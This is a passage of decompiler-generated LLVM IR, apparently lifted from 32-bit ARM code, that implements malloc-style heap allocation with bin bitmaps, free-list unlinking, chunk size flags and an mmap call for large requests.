  %v2_10444 = add i32 %v0_10414, 4
  %v3_10444 = inttoptr i32 %v2_10444 to i32*
  store i32 %v1_10438, i32* %v3_10444, align 4
  %v0_10448 = load i32, i32* %r2.global-to-local, align 4
  %v1_10448 = load i32, i32* @r6, align 4
  %v2_10448 = add i32 %v1_10448, 8
  %v3_10448 = inttoptr i32 %v2_10448 to i32*
  store i32 %v0_10448, i32* %v3_10448, align 4
  %v0_1044c = load i32, i32* %r2.global-to-local, align 4
  %v1_1044c = load i32, i32* @r6, align 4
  %v2_1044c = add i32 %v1_1044c, 12
  %v3_1044c = inttoptr i32 %v2_1044c to i32*
  store i32 %v0_1044c, i32* %v3_1044c, align 4
  %v0_10450 = load i32, i32* %lr.global-to-local, align 4
  %v1_10450 = load i32, i32* %r2.global-to-local, align 4
  %v3_10450 = add i32 %v1_10450, %v0_10450
  %v4_10450 = inttoptr i32 %v3_10450 to i32*
  store i32 %v0_10450, i32* %v4_10450, align 4
  %v0_10454 = load i32, i32* %r1.global-to-local, align 4
  %v1_10454 = load i32, i32* %r2.global-to-local, align 4
  %v2_10454 = add i32 %v1_10454, 4
  %v3_10454 = inttoptr i32 %v2_10454 to i32*
  store i32 %v0_10454, i32* %v3_10454, align 4
  %v0_10458 = load i32, i32* @r6, align 4
  %v1_10458 = load i32, i32* %r2.global-to-local, align 4
  %v2_10458 = add i32 %v1_10458, 12
  %v3_10458 = inttoptr i32 %v2_10458 to i32*
  store i32 %v0_10458, i32* %v3_10458, align 4
  %v0_1045c = load i32, i32* @r6, align 4
  %v1_1045c = load i32, i32* %r2.global-to-local, align 4
  %v2_1045c = add i32 %v1_1045c, 8
  %v3_1045c = inttoptr i32 %v2_1045c to i32*
  store i32 %v0_1045c, i32* %v3_1045c, align 4
  br label %dec_label_pc_109e8

dec_label_pc_10468:                               ; preds = %dec_label_pc_103d0, %dec_label_pc_103c0
  %v1_103f8 = phi i32 [ %storemerge.pre, %dec_label_pc_103c0 ], [ %v3_103dc, %dec_label_pc_103d0 ]
  store i32 %v1_103f8, i32* %ip.global-to-local, align 4
  %v9_10468 = icmp eq i32 %v1_103f8, %v1_103c4
  br i1 %v9_10468, label %dec_label_pc_10470.loopexit, label %dec_label_pc_103d0

dec_label_pc_10470.loopexit:                      ; preds = %dec_label_pc_10468
  br label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %dec_label_pc_103b8.dec_label_pc_10470_crit_edge, %dec_label_pc_10470.loopexit
  %v4_104a0.pre-phi = phi i32 [ %.pre200, %dec_label_pc_103b8.dec_label_pc_10470_crit_edge ], [ %v4_103c0, %dec_label_pc_10470.loopexit ]
  %v1_10470 = add i32 %v0_10470.pre, 1
  store i32 %v1_10470, i32* %r2.global-to-local, align 4
  %v1_10474 = urem i32 %v1_10470, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 142964, i32* %r0.global-to-local, align 4
  %v6_10480 = shl i32 1, %v1_10474
  store i32 %v6_10480, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_10488 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10488, i32* %r3.global-to-local, align 4
  %v3_1048c = udiv i32 %v1_10470, 32
  store i32 %v3_1048c, i32* @r5, align 4
  %v4_10490 = mul nuw nsw i32 %v3_1048c, 4
  %v5_10490 = add i32 %v4_10488, %v4_10490
  store i32 %v5_10490, i32* %r2.global-to-local, align 4
  %v1_10494 = add i32 %v5_10490, 820
  %v2_10494 = inttoptr i32 %v1_10494 to i32*
  %v3_10494 = load i32, i32* %v2_10494, align 4
  store i32 %v3_10494, i32* @r4, align 4
  %v1_10498 = add i32 %v4_10488, 52
  store i32 %v1_10498, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_104a0 = add i32 %v1_10498, %v4_104a0.pre-phi
  store i32 %v5_104a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_104a4

dec_label_pc_104a4:                               ; preds = %dec_label_pc_1050c, %dec_label_pc_10470
  %v1_104ac = phi i32 [ %v1_104ac.pre, %dec_label_pc_1050c ], [ %v3_10494, %dec_label_pc_10470 ]
  %v0_104ac = phi i32 [ %v0_104a4.pre, %dec_label_pc_1050c ], [ %v6_10480, %dec_label_pc_10470 ]
  %v1_104a4 = sub i32 1, %v0_104ac
  %v2_104a4 = icmp ult i32 %v0_104ac, 2
  %v1_104a4. = select i1 %v2_104a4, i32 %v1_104a4, i32 0
  store i32 %v1_104a4., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_104ac, %v1_104ac
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_104a4
  %v5_104b0 = or i32 %v1_104a4., 1
  store i32 %v5_104b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_104bc.preheader

bb142:                                            ; preds = %dec_label_pc_104a4
  %v2_104b4 = icmp eq i32 %v1_104a4., 0
  br i1 %v2_104b4, label %.dec_label_pc_104f8.preheader_crit_edge, label %dec_label_pc_104bc.preheader

.dec_label_pc_104f8.preheader_crit_edge:          ; preds = %bb142
  %v0_104f054.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_104f8.preheader

dec_label_pc_104bc.preheader:                     ; preds = %bb142, %.thread12
  %v0_104bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_104bc

dec_label_pc_104bc:                               ; preds = %dec_label_pc_104bc.preheader, %dec_label_pc_104c8
  %v0_104bc = phi i32 [ %v0_104bc.pre, %dec_label_pc_104bc.preheader ], [ %v1_104bc, %dec_label_pc_104c8 ]
  %v1_104bc = add i32 %v0_104bc, 1
  store i32 %v1_104bc, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_104bc, 2
  br i1 %tmp208, label %dec_label_pc_1059c.loopexit, label %dec_label_pc_104c8

dec_label_pc_104c8:                               ; preds = %dec_label_pc_104bc
  store i32 142964, i32* %r3.global-to-local, align 4
  %v1_104cc = load i32, i32* @r8, align 4
  %v2_104cc = add i32 %v1_104cc, 142964
  %v3_104cc = inttoptr i32 %v2_104cc to i32*
  %v4_104cc = load i32, i32* %v3_104cc, align 4
  store i32 %v4_104cc, i32* %r2.global-to-local, align 4
  %v4_104d0 = mul i32 %v1_104bc, 4
  %v5_104d0 = add i32 %v4_104cc, %v4_104d0
  store i32 %v5_104d0, i32* %r3.global-to-local, align 4
  %v1_104d4 = add i32 %v5_104d0, 820
  %v2_104d4 = inttoptr i32 %v1_104d4 to i32*
  %v3_104d4 = load i32, i32* %v2_104d4, align 4
  store i32 %v3_104d4, i32* @r4, align 4
  %v2_104d8 = icmp eq i32 %v3_104d4, 0
  br i1 %v2_104d8, label %dec_label_pc_104bc, label %dec_label_pc_104e0

dec_label_pc_104e0:                               ; preds = %dec_label_pc_104c8
  %v4_104e0 = mul i32 %v1_104bc, 256
  %v5_104e0 = add i32 %v4_104cc, %v4_104e0
  store i32 %v5_104e0, i32* %r3.global-to-local, align 4
  %v1_104e4 = add i32 %v5_104e0, 44
  store i32 %v1_104e4, i32* %r0.global-to-local, align 4
  %v0_104e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_104e8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_104f8.preheader

dec_label_pc_104f8.preheader:                     ; preds = %.dec_label_pc_104f8.preheader_crit_edge, %dec_label_pc_104e0
  %v0_104f054 = phi i32 [ %v1_104e4, %dec_label_pc_104e0 ], [ %v0_104f054.pre, %.dec_label_pc_104f8.preheader_crit_edge ]
  %v0_10514 = phi i32 [ %v3_104d4, %dec_label_pc_104e0 ], [ %v1_104ac, %.dec_label_pc_104f8.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_104e8, %dec_label_pc_104e0 ], [ %v0_104ac, %.dec_label_pc_104f8.preheader_crit_edge ]
  %v2_104f851 = and i32 %ip.promoted, %v0_10514
  %v4_104f853 = icmp eq i32 %v2_104f851, 0
  br i1 %v4_104f853, label %dec_label_pc_104f0, label %dec_label_pc_10500

dec_label_pc_104f0:                               ; preds = %dec_label_pc_104f8.preheader, %dec_label_pc_104f0
  %v2_104f456 = phi i32 [ %v2_104f4, %dec_label_pc_104f0 ], [ %ip.promoted, %dec_label_pc_104f8.preheader ]
  %v0_104f055 = phi i32 [ %v1_104f0, %dec_label_pc_104f0 ], [ %v0_104f054, %dec_label_pc_104f8.preheader ]
  %v1_104f0 = add i32 %v0_104f055, 8
  %v2_104f4 = mul i32 %v2_104f456, 2
  %v2_104f8 = and i32 %v2_104f4, %v0_10514
  %v4_104f8 = icmp eq i32 %v2_104f8, 0
  br i1 %v4_104f8, label %dec_label_pc_104f0, label %dec_label_pc_104f8.dec_label_pc_10500_crit_edge

dec_label_pc_104f8.dec_label_pc_10500_crit_edge:  ; preds = %dec_label_pc_104f0
  store i32 %v1_104f0, i32* %r0.global-to-local, align 4
  store i32 %v2_104f4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10500

dec_label_pc_10500:                               ; preds = %dec_label_pc_104f8.dec_label_pc_10500_crit_edge, %dec_label_pc_104f8.preheader
  %v0_10520 = phi i32 [ %v2_104f4, %dec_label_pc_104f8.dec_label_pc_10500_crit_edge ], [ %ip.promoted, %dec_label_pc_104f8.preheader ]
  %v0_10544 = phi i32 [ %v1_104f0, %dec_label_pc_104f8.dec_label_pc_10500_crit_edge ], [ %v0_104f054, %dec_label_pc_104f8.preheader ]
  %v1_10500 = add i32 %v0_10544, 12
  %v2_10500 = inttoptr i32 %v1_10500 to i32*
  %v3_10500 = load i32, i32* %v2_10500, align 4
  store i32 %v3_10500, i32* @lr, align 4
  %v9_10504 = icmp eq i32 %v3_10500, %v0_10544
  br i1 %v9_10504, label %dec_label_pc_1050c, label %dec_label_pc_1052c

dec_label_pc_1050c:                               ; preds = %dec_label_pc_10500
  store i32 142964, i32* %r0.global-to-local, align 4
  %v1_10510 = load i32, i32* @r8, align 4
  %v2_10510 = add i32 %v1_10510, 142964
  %v3_10510 = inttoptr i32 %v2_10510 to i32*
  %v4_10510 = load i32, i32* %v3_10510, align 4
  %v2_10514 = sub i32 -1, %v0_10520
  %v3_10514 = and i32 %v0_10514, %v2_10514
  store i32 %v3_10514, i32* @r4, align 4
  %v1_10518 = load i32, i32* @r5, align 4
  %v4_10518 = mul i32 %v1_10518, 4
  %v5_10518 = add i32 %v4_10518, %v4_10510
  store i32 %v5_10518, i32* %r3.global-to-local, align 4
  %v1_1051c = add i32 %v0_10544, 8
  store i32 %v1_1051c, i32* %r0.global-to-local, align 4
  %v2_10520 = mul i32 %v0_10520, 2
  store i32 %v2_10520, i32* %ip.global-to-local, align 4
  %v2_10524 = add i32 %v5_10518, 820
  %v3_10524 = inttoptr i32 %v2_10524 to i32*
  store i32 %v3_10514, i32* %v3_10524, align 4
  %v0_104a4.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_104ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_104a4

dec_label_pc_1052c:                               ; preds = %dec_label_pc_10500
  %v1_1052c = add i32 %v3_10500, 4
  %v2_1052c = inttoptr i32 %v1_1052c to i32*
  %v3_1052c = load i32, i32* %v2_1052c, align 4
  store i32 %v3_1052c, i32* %r3.global-to-local, align 4
  %v1_10530 = and i32 %v3_1052c, -4
  store i32 %v1_10530, i32* %r2.global-to-local, align 4
  %v0_10534 = load i32, i32* @sl, align 4
  %v2_10534 = sub i32 %v1_10530, %v0_10534
  store i32 %v2_10534, i32* %ip.global-to-local, align 4
  %v1_10538 = add i32 %v3_10500, 12
  %v2_10538 = inttoptr i32 %v1_10538 to i32*
  %v3_10538 = load i32, i32* %v2_10538, align 4
  store i32 %v3_10538, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_10534, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_1052c
  %v6_10540 = add i32 %v1_10530, %v3_10500
  store i32 %v6_10540, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_1052c, %bb143
  %v2_10544 = add i32 %v3_10538, 8
  %v3_10544 = inttoptr i32 %v2_10544 to i32*
  store i32 %v0_10544, i32* %v3_10544, align 4
  %v0_10548 = load i32, i32* %r3.global-to-local, align 4
  %v1_10548 = load i32, i32* %r0.global-to-local, align 4
  %v2_10548 = add i32 %v1_10548, 12
  %v3_10548 = inttoptr i32 %v2_10548 to i32*
  store i32 %v0_10548, i32* %v3_10548, align 4
  %v4_1054c = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_10428_crit_edge, label %dec_label_pc_10558

.dec_label_pc_10428_crit_edge:                    ; preds = %bb144
  %v5_1054c = add i32 %v4_1054c, 8
  store i32 %v5_1054c, i32* %r4.global-to-local, align 4
  %v4_10550 = load i32, i32* %r2.global-to-local, align 4
  %v5_10550 = add i32 %v4_10550, 4
  %v6_10550 = inttoptr i32 %v5_10550 to i32*
  %v7_10550 = load i32, i32* %v6_10550, align 4
  store i32 %v7_10550, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10428

dec_label_pc_10558:                               ; preds = %bb144
  %v1_10558 = load i32, i32* @sl, align 4
  %v2_10558 = add i32 %v1_10558, %v4_1054c
  store i32 %v2_10558, i32* %r1.global-to-local, align 4
  %v1_10560 = load i32, i32* @r6, align 4
  %v2_10560 = add i32 %v1_10560, 8
  %v3_10560 = inttoptr i32 %v2_10560 to i32*
  store i32 %v2_10558, i32* %v3_10560, align 4
  %v0_10564 = load i32, i32* %r1.global-to-local, align 4
  %v1_10564 = load i32, i32* @r6, align 4
  %v2_10564 = add i32 %v1_10564, 12
  %v3_10564 = inttoptr i32 %v2_10564 to i32*
  store i32 %v0_10564, i32* %v3_10564, align 4
  %v0_10568 = load i32, i32* @r6, align 4
  %v1_10568 = load i32, i32* %r1.global-to-local, align 4
  %v2_10568 = add i32 %v1_10568, 8
  %v3_10568 = inttoptr i32 %v2_10568 to i32*
  store i32 %v0_10568, i32* %v3_10568, align 4
  %v0_1056c = load i32, i32* @r6, align 4
  %v1_1056c = load i32, i32* %r1.global-to-local, align 4
  %v2_1056c = add i32 %v1_1056c, 12
  %v3_1056c = inttoptr i32 %v2_1056c to i32*
  store i32 %v0_1056c, i32* %v3_1056c, align 4
  %tmp210 = icmp ult i32 %v1_10558, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_10558
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r2.global-to-local, align 4
  %v8_10578 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v8_10578, i32* %r3.global-to-local, align 4
  %v4_1057c = load i32, i32* %r1.global-to-local, align 4
  %v6_1057c = add i32 %v8_10578, 48
  %v7_1057c = inttoptr i32 %v6_1057c to i32*
  store i32 %v4_1057c, i32* %v7_1057c, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_10558, %bb145
  %v0_10580 = load i32, i32* @sl, align 4
  %v1_10580 = or i32 %v0_10580, 1
  store i32 %v1_10580, i32* %r2.global-to-local, align 4
  %v0_10584 = load i32, i32* %ip.global-to-local, align 4
  %v1_10584 = or i32 %v0_10584, 1
  store i32 %v1_10584, i32* %r3.global-to-local, align 4
  %v0_10588 = load i32, i32* @lr, align 4
  %v1_10588 = add i32 %v0_10588, 8
  store i32 %v1_10588, i32* %r4.global-to-local, align 4
  %v2_1058c = add i32 %v0_10588, 4
  %v3_1058c = inttoptr i32 %v2_1058c to i32*
  store i32 %v1_10580, i32* %v3_1058c, align 4
  %v0_10590 = load i32, i32* %ip.global-to-local, align 4
  %v1_10590 = load i32, i32* %r1.global-to-local, align 4
  %v3_10590 = add i32 %v1_10590, %v0_10590
  %v4_10590 = inttoptr i32 %v3_10590 to i32*
  store i32 %v0_10590, i32* %v4_10590, align 4
  %v0_10594 = load i32, i32* %r3.global-to-local, align 4
  %v1_10594 = load i32, i32* %r1.global-to-local, align 4
  %v2_10594 = add i32 %v1_10594, 4
  %v3_10594 = inttoptr i32 %v2_10594 to i32*
  store i32 %v0_10594, i32* %v3_10594, align 4
  br label %dec_label_pc_109e8

dec_label_pc_1059c.loopexit:                      ; preds = %dec_label_pc_104bc
  br label %dec_label_pc_1059c

dec_label_pc_1059c:                               ; preds = %dec_label_pc_1059c.loopexit, %dec_label_pc_101b0, %dec_label_pc_101b8
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  %v4_105a4 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_105a4, i32* @r0, align 4
  %v1_105a8 = add i32 %v4_105a4, 44
  %v2_105a8 = inttoptr i32 %v1_105a8 to i32*
  %v3_105a8 = load i32, i32* %v2_105a8, align 4
  store i32 %v3_105a8, i32* %ip.global-to-local, align 4
  %v1_105ac = add i32 %v3_105a8, 4
  %v2_105ac = inttoptr i32 %v1_105ac to i32*
  %v3_105ac = load i32, i32* %v2_105ac, align 4
  %v0_105b0 = load i32, i32* @sl, align 4
  %v1_105b0 = add i32 %v0_105b0, 16
  store i32 %v1_105b0, i32* %r1.global-to-local, align 4
  %v1_105b4 = and i32 %v3_105ac, -4
  store i32 %v1_105b4, i32* %r3.global-to-local, align 4
  %v3_105b8 = icmp ult i32 %v1_105b4, %v1_105b0
  br i1 %v3_105b8, label %dec_label_pc_105e8, label %dec_label_pc_105c4

dec_label_pc_105c4:                               ; preds = %dec_label_pc_1059c
  %v2_105c4 = sub i32 %v1_105b4, %v0_105b0
  %v2_105c8 = add i32 %v0_105b0, %v3_105a8
  store i32 %v2_105c8, i32* %r1.global-to-local, align 4
  %v1_105cc = or i32 %v2_105c4, 1
  store i32 %v1_105cc, i32* %r3.global-to-local, align 4
  %v1_105d0 = or i32 %v0_105b0, 1
  store i32 %v1_105d0, i32* %r2.global-to-local, align 4
  %v1_105d4 = add i32 %v3_105a8, 8
  store i32 %v1_105d4, i32* %r4.global-to-local, align 4
  store i32 %v1_105d0, i32* %v2_105ac, align 4
  %v0_105dc = load i32, i32* %r1.global-to-local, align 4
  %v1_105dc = load i32, i32* @r0, align 4
  %v2_105dc = add i32 %v1_105dc, 44
  %v3_105dc = inttoptr i32 %v2_105dc to i32*
  store i32 %v0_105dc, i32* %v3_105dc, align 4
  %v0_105e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_105e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_105e0 = add i32 %v1_105e0, 4
  %v3_105e0 = inttoptr i32 %v2_105e0 to i32*
  store i32 %v0_105e0, i32* %v3_105e0, align 4
  br label %dec_label_pc_109e8

dec_label_pc_105e8:                               ; preds = %dec_label_pc_1059c
  %v1_105e8 = inttoptr i32 %v4_105a4 to i32*
  %v2_105e8 = load i32, i32* %v1_105e8, align 4
  store i32 %v2_105e8, i32* %r3.global-to-local, align 4
  %v1_105ec = and i32 %v2_105e8, 2
  store i32 %v1_105ec, i32* %ip.global-to-local, align 4
  %v2_105ec = icmp eq i32 %v1_105ec, 0
  %v1_105f0 = add i32 %v4_105a4, 860
  %v2_105f0 = inttoptr i32 %v1_105f0 to i32*
  %v3_105f0 = load i32, i32* %v2_105f0, align 4
  store i32 %v3_105f0, i32* %r1.global-to-local, align 4
  br i1 %v2_105ec, label %dec_label_pc_10608, label %dec_label_pc_105f8

dec_label_pc_105f8:                               ; preds = %dec_label_pc_105e8
  %v0_105f8 = call i32 @function_10e94()
  %v0_105fc = load i32, i32* @sl, align 4
  %v1_105fc = add i32 %v0_105fc, -7
  store i32 %v1_105fc, i32* %r0.global-to-local, align 4
  %v1_10600 = call i32 @function_10110(i32 %v1_105fc)
  store i32 %v1_10600, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_109e4

dec_label_pc_10608:                               ; preds = %dec_label_pc_105e8
  %v1_10608 = add i32 %v4_105a4, 844
  %v2_10608 = inttoptr i32 %v1_10608 to i32*
  %v3_10608 = load i32, i32* %v2_10608, align 4
  store i32 %v3_10608, i32* %r3.global-to-local, align 4
  %v3_1060c = icmp ult i32 %v0_105b0, %v3_10608
  %v1_10610 = add i32 %v3_105f0, -1
  store i32 %v1_10610, i32* %sb.global-to-local, align 4
  br i1 %v3_1060c, label %dec_label_pc_106e4, label %dec_label_pc_10618

dec_label_pc_10618:                               ; preds = %dec_label_pc_10608
  %v1_10618 = add i32 %v4_105a4, 852
  %v2_10618 = inttoptr i32 %v1_10618 to i32*
  %v3_10618 = load i32, i32* %v2_10618, align 4
  store i32 %v3_10618, i32* %r2.global-to-local, align 4
  %v1_1061c = add i32 %v4_105a4, 848
  %v2_1061c = inttoptr i32 %v1_1061c to i32*
  %v3_1061c = load i32, i32* %v2_1061c, align 4
  store i32 %v3_1061c, i32* %r3.global-to-local, align 4
  %v6_10624 = icmp slt i32 %v3_1061c, %v3_10618
  br i1 %v6_10624, label %dec_label_pc_10628, label %dec_label_pc_106e4

dec_label_pc_10628:                               ; preds = %dec_label_pc_10618
  %v1_10628 = add i32 %v0_105b0, 10
  %v2_1062c = add i32 %v1_10628, %v3_105f0
  store i32 %v2_1062c, i32* %r3.global-to-local, align 4
  %v2_10630 = sub i32 0, %v3_105f0
  %v3_10630 = and i32 %v2_1062c, %v2_10630
  store i32 %v3_10630, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_10630, %v0_105b0
  br i1 %tmp211, label %dec_label_pc_1063c, label %dec_label_pc_106e4

dec_label_pc_1063c:                               ; preds = %dec_label_pc_10628
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_10630, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_10654 = call i32 @function_12978(i32 0, i32 %v3_10630, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_10654, i32* %r0.global-to-local, align 4
  %v7_10658 = icmp eq i32 %v6_10654, -1
  br i1 %v7_10658, label %dec_label_pc_1063c.dec_label_pc_106e4_crit_edge, label %dec_label_pc_10660

dec_label_pc_1063c.dec_label_pc_106e4_crit_edge:  ; preds = %dec_label_pc_1063c
  %v1_10708.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_106e4

dec_label_pc_10660:                               ; preds = %dec_label_pc_1063c
  %v1_10660 = urem i32 %v6_10654, 8
  store i32 %v1_10660, i32* %r2.global-to-local, align 4
  %v2_10660 = icmp eq i32 %v1_10660, 0
  br i1 %v2_10660, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_10660
  %v2_10664 = sub nsw i32 8, %v1_10660
  store i32 %v2_10664, i32* %r3.global-to-local, align 4
  %v2_10668 = load i32, i32* @r4, align 4
  %v3_10668 = sub i32 %v2_10668, %v2_10664
  %v3_1066c = add i32 %v2_10664, %v6_10654
  store i32 %v3_1066c, i32* %lr.global-to-local, align 4
  %v2_10674 = or i32 %v3_10668, 2
  store i32 %v2_10674, i32* %r2.global-to-local, align 4
  %v5_1067c = inttoptr i32 %v3_1066c to i32*
  store i32 %v2_10664, i32* %v5_1067c, align 4
  %v1_10680 = load i32, i32* %r2.global-to-local, align 4
  %v2_10680 = load i32, i32* %lr.global-to-local, align 4
  %v3_10680 = add i32 %v2_10680, 4
  %v4_10680 = inttoptr i32 %v3_10680 to i32*
  store i32 %v1_10680, i32* %v4_10680, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_10660
  store i32 %v6_10654, i32* %lr.global-to-local, align 4
  %v1_1067847 = load i32, i32* @r4, align 4
  %v2_1067848 = or i32 %v1_1067847, 2
  store i32 %v2_1067848, i32* %r3.global-to-local, align 4
  %v3_10684 = inttoptr i32 %v6_10654 to i32*
  store i32 0, i32* %v3_10684, align 4
  %v1_10688 = load i32, i32* %r3.global-to-local, align 4
  %v2_10688 = load i32, i32* %lr.global-to-local, align 4
  %v3_10688 = add i32 %v2_10688, 4
  %v4_10688 = inttoptr i32 %v3_10688 to i32*
  store i32 %v1_10688, i32* %v4_10688, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 142964, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_10694 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10694, i32* %ip.global-to-local, align 4
  %v1_10698 = add i32 %v4_10694, 848
  %v2_10698 = inttoptr i32 %v1_10698 to i32*
  %v3_10698 = load i32, i32* %v2_10698, align 4
  store i32 %v3_10698, i32* %r3.global-to-local, align 4
  %v1_1069c = add i32 %v4_10694, 856
  %v2_1069c = inttoptr i32 %v1_1069c to i32*
  %v3_1069c = load i32, i32* %v2_1069c, align 4
  store i32 %v3_1069c, i32* %r2.global-to-local, align 4
  %v1_106a0 = add i32 %v3_10698, 1
  store i32 %v1_106a0, i32* %r3.global-to-local, align 4
  %v7_106a8 = icmp sgt i32 %v1_106a0, %v3_1069c
  br i1 %v7_106a8, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_106a0, i32* %v2_1069c, align 4
  %v0_106ac.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_106ac.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_106ac = phi i32 [ %v4_10694, %.thread27 ], [ %v1_106ac.pre, %bb147 ]
  %v0_106ac = phi i32 [ %v1_106a0, %.thread27 ], [ %v0_106ac.pre, %bb147 ]
  %v2_106ac = add i32 %v1_106ac, 848
  %v3_106ac = inttoptr i32 %v2_106ac to i32*
  store i32 %v0_106ac, i32* %v3_106ac, align 4
  %v0_106b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_106b0 = add i32 %v0_106b0, 868
  %v2_106b0 = inttoptr i32 %v1_106b0 to i32*
  %v3_106b0 = load i32, i32* %v2_106b0, align 4
  store i32 %v3_106b0, i32* %r3.global-to-local, align 4
  %v1_106b4 = add i32 %v0_106b0, 880
  %v2_106b4 = inttoptr i32 %v1_106b4 to i32*
  %v3_106b4 = load i32, i32* %v2_106b4, align 4
  store i32 %v3_106b4, i32* %r2.global-to-local, align 4
  %v0_106b8 = load i32, i32* @r4, align 4
  %v2_106b8 = add i32 %v0_106b8, %v3_106b0
  store i32 %v2_106b8, i32* %r1.global-to-local, align 4
  %v1_106bc = add i32 %v0_106b0, 872
  %v2_106bc = inttoptr i32 %v1_106bc to i32*
  %v3_106bc = load i32, i32* %v2_106bc, align 4
  store i32 %v3_106bc, i32* %r3.global-to-local, align 4
  %v1_106c4 = add i32 %v0_106b0, 884
  %v2_106c4 = inttoptr i32 %v1_106c4 to i32*
  %v3_106c4 = load i32, i32* %v2_106c4, align 4
  store i32 %v3_106c4, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_106b8, %v3_106b4
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_106b8, i32* %v2_106b4, align 4
  %v0_106cc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_106cc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_106cc = phi i32 [ %v0_106b0, %bb148 ], [ %v1_106cc.pre, %bb149 ]
  %v0_106cc = phi i32 [ %v2_106b8, %bb148 ], [ %v0_106cc.pre, %bb149 ]
  %v2_106cc = add i32 %v1_106cc, 868
  %v3_106cc = inttoptr i32 %v2_106cc to i32*
  store i32 %v0_106cc, i32* %v3_106cc, align 4
  %v0_106d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_106d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_106d0 = add i32 %v1_106d0, %v0_106d0
  store i32 %v2_106d0, i32* %r1.global-to-local, align 4
  %v1_106d4 = load i32, i32* %r2.global-to-local, align 4
  %v0_106d8 = load i32, i32* %lr.global-to-local, align 4
  %v1_106d8 = add i32 %v0_106d8, 8
  store i32 %v1_106d8, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_106d0, %v1_106d4
  br i1 %tmp213, label %bb151, label %dec_label_pc_109e4

bb151:                                            ; preds = %bb150
  %v5_106dc = load i32, i32* %ip.global-to-local, align 4
  %v6_106dc = add i32 %v5_106dc, 884
  %v7_106dc = inttoptr i32 %v6_106dc to i32*
  store i32 %v2_106d0, i32* %v7_106dc, align 4
  br label %dec_label_pc_109e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_10628, %dec_label_pc_10608, %dec_label_pc_1063c.dec_label_pc_106e4_crit_edge, %dec_label_pc_10618
  %v1_10708 = phi i32 [ %v1_10708.pre, %dec_label_pc_1063c.dec_label_pc_106e4_crit_edge ], [ %v0_105b0, %dec_label_pc_10618 ], [ %v0_105b0, %dec_label_pc_10608 ], [ %v0_105b0, %dec_label_pc_10628 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  %v4_106ec = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_106ec, i32* %r3.global-to-local, align 4
  %v1_106f0 = add i32 %v4_106ec, 44
  %v2_106f0 = inttoptr i32 %v1_106f0 to i32*
  %v3_106f0 = load i32, i32* %v2_106f0, align 4
  store i32 %v3_106f0, i32* %r0.global-to-local, align 4
  %v1_106f4 = add i32 %v4_106ec, 864
  %v2_106f4 = inttoptr i32 %v1_106f4 to i32*
  %v3_106f4 = load i32, i32* %v2_106f4, align 4
  store i32 %v3_106f4, i32* %r2.global-to-local, align 4
  %v1_106f8 = add i32 %v4_106ec, 840
  %v2_106f8 = inttoptr i32 %v1_106f8 to i32*
  %v3_106f8 = load i32, i32* %v2_106f8, align 4
  store i32 %v3_106f8, i32* %r3.global-to-local, align 4
